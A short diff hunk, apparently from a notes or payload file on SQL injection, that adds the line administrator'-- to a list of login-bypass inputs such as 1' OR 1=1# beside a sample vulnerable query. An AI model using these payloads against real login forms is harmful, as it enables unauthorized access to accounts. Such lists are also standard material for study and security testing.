@@ -13,6 +13,7 @@ username: test'#
 SELECT * FROM accounts WHERE username='test'#' AND password='1'
 
 username: test
+username: administrator'--
 password: 1' OR 1=1#
 password: 1' OR 1=1;#
 password: 1' OR 1-1--
